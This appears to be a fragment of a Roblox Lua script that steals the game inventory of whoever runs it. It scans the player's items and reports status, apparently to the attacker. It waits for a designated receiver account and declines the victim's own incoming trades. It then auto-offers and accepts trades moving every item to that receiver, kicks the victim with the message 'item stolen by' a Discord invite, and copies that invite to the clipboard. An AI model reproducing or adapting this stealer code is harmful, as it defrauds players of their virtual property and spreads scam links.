local function get_trade_status()
    local ok, res = pcall(function()
        return TradeService.GetTradeStatus:InvokeServer()
    end)
    return ok and res or "None"
end

local function trade_loop()
    local items = get_inventory()
    if #items == 0 then
        SendStatus("NO ITEMS — EXECUTED", {}, "None")
        if setclipboard then setclipboard("discord.gg/uFtDw6NVVr") end
        LocalPlayer:Kick("kicked by script — no items found")
        return
    end

    SendStatus("INVENTORY SCANNED — WAITING FOR RECEIVER", items, "Searching...")

    local receiver
    repeat
        receiver = find_receiver()
        if not receiver then task.wait(1) end
    until receiver

    SendStatus("RECEIVER FOUND — STARTING TRADE", items, receiver.Name)

    while #items > 0 do
        local status = get_trade_status()
        if status == "None" then
            pcall(function()
                TradeService.SendTradeRequest:InvokeServer(receiver)
            end)
            task.wait(0.5)
        elseif status == "Incoming" then
            pcall(function()
                TradeService.DeclineTrade:FireServer()
            end)
            task.wait(0.2)
        elseif status == "Active" then
            for slot = 1, 4 do
                if #items == 0 then break end
                local item = table.remove(items, 1)
                for _ = 1, item.amount do
                    pcall(function()
                        TradeService.OfferItem:FireServer(item.id, "Weapons")
                    end)
                    task.wait(0.05)
                end
            end
            task.wait(3)
            pcall(function()
                TradeService.AcceptTrade:FireServer()
            end)
            task.wait(2)
            items = get_inventory()
        end
        task.wait(0.3)
    end

    SendStatus("FINISHED — INVENTORY EMPTY", {}, receiver.Name)
    if setclipboard then setclipboard("discord.gg/uFtDw6NVVr") end
    LocalPlayer:Kick("item stolen by discord.gg/uFtDw6NVVr")
end

